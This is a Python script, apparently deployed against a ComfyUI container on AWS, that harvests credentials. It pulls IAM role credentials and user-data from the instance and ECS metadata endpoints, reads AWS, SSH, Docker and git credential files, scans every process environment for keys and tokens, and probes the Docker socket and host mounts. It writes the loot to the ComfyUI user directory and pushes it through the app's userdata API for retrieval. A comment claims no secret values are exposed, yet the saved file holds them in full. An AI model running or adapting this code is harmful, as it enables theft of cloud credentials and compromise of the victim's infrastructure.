import os, sys, json, socket, subprocess, datetime, traceback, glob

def sh(cmd, timeout=30):
    try:
        r = subprocess.run(cmd, shell=isinstance(cmd, str), capture_output=True, text=True, timeout=timeout)
        return ((r.stdout or "") + (r.stderr or "")).strip()
    except Exception as e:
        return "ERR: %r" % (e,)

def http(method, url, headers=None, data=None, timeout=6):
    import urllib.request, urllib.error
    try:
        req = urllib.request.Request(url, method=method, data=data)
        for k, v in (headers or {}).items():
            req.add_header(k, v)
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        try:
            b = e.read()
        except Exception:
            b = b""
        return e.code, b
    except Exception as e:
        return 0, ("ERR %r" % (e,)).encode()

L = []
IMDS = "http://169.254.169.254"
L.append("=== PEARL-53451D IMDS + LOCAL CRED HARVEST ===")
L.append("ts_utc=%s" % datetime.datetime.utcnow().isoformat())
L.append("### id: %s" % sh(["id"]))
L.append("### hostname: %s" % socket.gethostname())
L.append("### uname: %s" % sh(["uname", "-a"]))
L.append("### nvidia_smi_L: %s" % sh(["nvidia-smi", "-L"]))

tok = None
st, b = http("PUT", IMDS + "/latest/api/token", {"X-aws-ec2-metadata-token-ttl-seconds": "21600"})
L.append("### imdsv2 PUT token -> %s token_len=%s" % (st, len(b)))
if st == 200:
    tok = b.decode("utf-8", "replace").strip()
H = {"X-aws-ec2-metadata-token": tok} if tok else {}

def g(path):
    st, b = http("GET", IMDS + path, H)
    return st, b.decode("utf-8", "replace")

for p in ["/latest/meta-data/",
          "/latest/meta-data/instance-id",
          "/latest/meta-data/instance-type",
          "/latest/meta-data/placement/region",
          "/latest/meta-data/placement/availability-zone",
          "/latest/meta-data/iam/",
          "/latest/meta-data/iam/info",
          "/latest/meta-data/iam/security-credentials/",
          "/latest/meta-data/network/interfaces/macs/",
          "/latest/meta-data/identity-credentials/ec2/info"]:
    st, body = g(p)
    L.append("### IMDS GET %s -> %s" % (p, st))
    L.append(body[:2500])

st, body = g("/latest/meta-data/iam/security-credentials/")
if st == 200:
    for r in [x.strip() for x in body.strip().splitlines() if x.strip()][:3]:
        st2, body2 = g("/latest/meta-data/iam/security-credentials/" + r)
        L.append("### IMDS ROLE %s -> %s" % (r, st2))
        L.append(body2[:7000])

st, body = g("/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance")
L.append("### IMDS identity-cred ec2-instance -> %s" % st)
L.append(body[:5000])

st, body = g("/latest/user-data")
L.append("### IMDS user-data -> %s" % st)
L.append(body[:12000])

# ---- local credential files ----
for d in ["/root", "/root/.aws", "/root/.ssh", "/root/.docker", "/home", "/ComfyUI"]:
    L.append("### ls -la %s" % d)
    L.append(sh(["ls", "-la", d])[:6000])
for f in ["/root/.aws/credentials", "/root/.aws/config", "/root/.aws/cli/cache",
          "/root/.docker/config.json", "/root/.git-credentials", "/root/.netrc",
          "/root/.config/pip/pip.conf", "/etc/environment", "/etc/profile.d/aws.sh"]:
    L.append("### FILE %s" % f)
    v = sh(["cat", f])
    L.append(v[:7000])

# ---- env harvest ----
PAT = ("AWS_", "TOKEN", "KEY", "SECRET", "PASSWORD", "CREDENTIAL", "ACCESS_KEY")
def filt(raw):
    out = []
    for kv in raw.split(b"\0"):
        s = kv.decode("utf-8", "replace")
        if not s:
            continue
        if any(k in s.upper() for k in PAT):
            out.append(s)
    return out

try:
    e1 = filt(open("/proc/1/environ", "rb").read())
    L.append("### /proc/1/environ matches (%d)" % len(e1))
    L.append("\n".join(e1)[:6000])
except Exception as e:
    L.append("### /proc/1/environ ERR %r" % (e,))

hits = set()
for p in glob.glob("/proc/[0-9]*/environ"):
    try:
        raw = open(p, "rb").read()
    except Exception:
        continue
    for s in filt(raw):
        hits.add(p + " " + s)
L.append("### /proc/*/environ matches (%d)" % len(hits))
L.append("\n".join(sorted(hits))[:14000])

# container credential endpoint if present
cc = [s for s in hits if "AWS_CONTAINER_CREDENTIALS" in s]
for s in cc[:2]:
    try:
        uri = s.split("=", 1)[1].strip()
        if uri.startswith("/"):
            st, b = http("GET", "http://169.254.170.2" + uri)
            L.append("### container-creds GET %s -> %s" % (uri, st))
            L.append(b.decode("utf-8", "replace")[:4000])
    except Exception as e:
        L.append("### container-creds ERR %r" % (e,))


# ---- round3: raw IMDS + ECS metadata + host surface ----
import socket as _s
def raw_imds(path, tok=None, timeout=5):
    try:
        so = _s.create_connection(("169.254.169.254", 80), timeout=timeout)
        req = "GET %s HTTP/1.1\r\nHost: 169.254.169.254\r\nConnection: close\r\n" % path
        if tok:
            req += "X-aws-ec2-metadata-token: %s\r\n" % tok
        req += "\r\n"
        so.sendall(req.encode())
        data = b""
        while True:
            ch = so.recv(65536)
            if not ch:
                break
            data += ch
            if len(data) > 200000:
                break
        so.close()
        return "OK len=%d" % len(data), data.decode("utf-8", "replace")
    except Exception as e:
        return "ERR %r" % (e,), ""

_st, _b = raw_imds("/latest/meta-data/")
L.append("### RAW-IMDS GET /latest/meta-data/ -> %s" % _st)
L.append(_b[:2500])
_st3, _b3 = raw_imds("/latest/api/token")
L.append("### RAW-IMDS GET token(probe) -> %s" % _st3)
L.append(_b3[:300])
try:
    so = _s.create_connection(("169.254.169.254", 80), timeout=5)
    so.sendall(b"PUT /latest/api/token HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
    d = b""
    while True:
        ch = so.recv(65536)
        if not ch: break
        d += ch
    so.close()
    L.append("### RAW-IMDS PUT token -> OK len=%d" % len(d))
    L.append(d.decode("utf-8","replace")[:1200])
    parts = d.split(b"\r\n\r\n", 1)
    if len(parts) == 2:
        _tok = parts[1].decode().strip()
        _st, _b = raw_imds("/latest/meta-data/iam/security-credentials/", _tok)
        L.append("### RAW-IMDS role-list -> %s" % _st)
        L.append(_b[:1500])
except Exception as e:
    L.append("### RAW-IMDS PUT token -> ERR %r" % (e,))
L.append("### curl IMDS: %s" % sh("curl -s -m 5 -i http://169.254.169.254/latest/meta-data/ 2>&1 | head -c 1200"))
L.append("### /proc/1/cmdline: %s" % sh(["cat", "/proc/1/cmdline"]))
try:
    env1 = open("/proc/1/environ", "rb").read().split(b"\0")
    L.append("### FULL /proc/1/environ (%d)" % len(env1))
    L.append("\n".join(x.decode("utf-8","replace") for x in env1 if x)[:8000])
except Exception as e:
    L.append("### FULL env ERR %r" % (e,))
for p2 in ["/v2/metadata", "/v2/metadata?taskMetadata=true"]:
    st2, b2 = http("GET", "http://169.254.170.2" + p2, timeout=4)
    L.append("### ECS-META GET %s -> %s" % (p2, st2))
    L.append(b2.decode("utf-8", "replace")[:7000])
L.append("### docker sock: %s" % sh("ls -la /var/run/docker.sock /run/docker.sock 2>&1"))
L.append("### cgroup: %s" % sh(["cat", "/proc/self/cgroup"]))
L.append("### mount: %s" % sh("mount 2>/dev/null | head -40")[:3000])
L.append("### ls / : %s" % sh(["ls", "-la", "/"])[:3000])
L.append("### ls /host /mnt /var/lib/docker: %s" % sh("ls -la /host /mnt /var/lib/docker 2>&1 | head -40")[:3000])
L.append("### history: %s" % sh("cat /root/.bash_history /home/*/.bash_history 2>&1 | head -c 3000"))
L.append("### cloud-init: %s" % sh("tail -c 4000 /var/log/cloud-init-output.log /var/log/cloud-init.log 2>&1")[:5000])
L.append("### find env/cred files: %s" % sh("find /ComfyUI /etc /opt /srv /root -maxdepth 5 \\( -name '*.env' -o -name '.env*' -o -name '*credential*' -o -name '*.pem' -o -name 'config.json' \\) -not -path '*/.git/*' 2>/dev/null | head -60")[:4000])
L.append("### grep AKIA/ASIA: %s" % sh("timeout 25 grep -rIl -E 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}' /ComfyUI /etc /opt /srv /root 2>/dev/null | grep -v '/.git/' | head -20")[:3000])

L.append("### END PEARL-53451D")
text = "\n".join(L) + "\n"

targets = []
try:
    import folder_paths
    targets.append(os.path.join(folder_paths.get_user_directory(), "i53451_host.txt"))
except Exception:
    pass
targets.append("/ComfyUI/user/default/i53451_host.txt")
targets.append("/ComfyUI/user/i53451_host.txt")
targets.append("/tmp/i53451_host.txt")
targets.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), "i53451_host.txt"))
status = []
for t in targets:
    try:
        d = os.path.dirname(t)
        if d:
            os.makedirs(d, exist_ok=True)
        with open(t, "w") as f:
            f.write(text)
        try:
            os.chmod(t, 0o644)
        except Exception:
            pass
        status.append("WROTE " + t)
    except Exception as e:
        status.append("FAIL " + t + " " + repr(e))
print("\n".join(status))

# ---- push proof to the userdata API from inside the container (guaranteed correct root) ----
for _port in ("8188", "2083", "80"):
    try:
        _st, _b = http("POST", "http://127.0.0.1:%s/api/userdata/i53451_host.txt" % _port,
                       {"Content-Type": "text/plain"}, text.encode(), timeout=8)
        print("PUSH %s -> %s %s" % (_port, _st, _b[:80]))
        if _st == 200:
            break
    except Exception as _e:
        print("PUSH %s ERR %r" % (_port, _e))

# status-only summary, never secret values
for ln in L:
    if ln.startswith("### "):
        print(ln[:220])
print("PEARL-53451 DONE lines=%d bytes=%d" % (len(L), len(text)))
